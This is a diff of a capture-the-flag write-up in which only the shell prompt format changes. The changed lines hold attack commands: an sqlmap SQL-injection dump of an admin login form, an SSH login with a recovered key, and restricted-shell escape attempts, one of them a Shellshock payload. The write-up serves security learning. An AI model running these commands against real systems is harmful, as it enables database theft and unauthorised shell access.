@@ -180,7 +180,7 @@ So what do we have to set to Sqlmap :
 - **Action to perform** : dump the database with `--dump`
 
 ```
-th1b4ud@th1b4ud-pc $ sqlmap -u "http://51.75.202.113:2077/zetatech-admin.php" --data "username=test&password=test&login=Login" -p "username" --method POST --random-agent --technique=T --level=5 --risk=2 --dbms=mysql --dump
+[th1b4ud@th1b4ud-pc ~]$ sqlmap -u "http://51.75.202.113:2077/zetatech-admin.php" --data "username=test&password=test&login=Login" -p "username" --method POST --random-agent --technique=T --level=5 --risk=2 --dbms=mysql --dump
         ___
        __H__
  ___ ___[.]_____ ___ ___  {1.2.11#stable}
@@ -303,7 +303,7 @@ ncjE2bXV8Kbzf5ifvikciUMTxnF7l+PehJulNP2+Mk5NBXOAcZdjO7sfxA==
 Why not try a ssh connexion with the username `puppet-master` on the port `2021` (see description)
 
 ```
-th1b4ud@th1b4ud-pc $ ssh puppet-master@51.75.202.113 -p 2021 -i key
+[th1b4ud@th1b4ud-pc ~]$ ssh puppet-master@51.75.202.113 -p 2021 -i key
 
 .___..___.___..__..___..___ __ .  .
   _/ [__   |  [__]  |  [__ /  `|__|
@@ -357,7 +357,7 @@ ssh restricted@10.20.30.40 -t "() { :; }; /bin/bash"
 Let's try this 3 commands
 
 ```
-th1b4ud@th1b4ud-pc $ ssh puppet-master@51.75.202.113 -p 2021 -i key -t "/bin/sh"
+[th1b4ud@th1b4ud-pc ~]$ ssh puppet-master@51.75.202.113 -p 2021 -i key -t "/bin/sh"
 
 [...]
 
@@ -367,7 +367,7 @@ Connection to 51.75.202.113 closed.
 No
 
 ```
-th1b4ud@th1b4ud-pc $ ssh puppet-master@51.75.202.113 -p 2021 -i key -t "bash --noprofile"
+[th1b4ud@th1b4ud-pc ~]$ ssh puppet-master@51.75.202.113 -p 2021 -i key -t "bash --noprofile"
 
 [...]
 
@@ -377,7 +377,7 @@ Connection to 51.75.202.113 closed.
 No
 
 ```
-th1b4ud@th1b4ud-pc $ ssh puppet-master@51.75.202.113 -p 2021 -i key -t "() { :; }; /bin/bash"
+[th1b4ud@th1b4ud-pc ~]$ ssh puppet-master@51.75.202.113 -p 2021 -i key -t "() { :; }; /bin/bash"
 .___..___.___..__..___..___ __ .  .
   _/ [__   |  [__]  |  [__ /  `|__|
 ./__.[___  |  |  |  |  [___\__.|  |
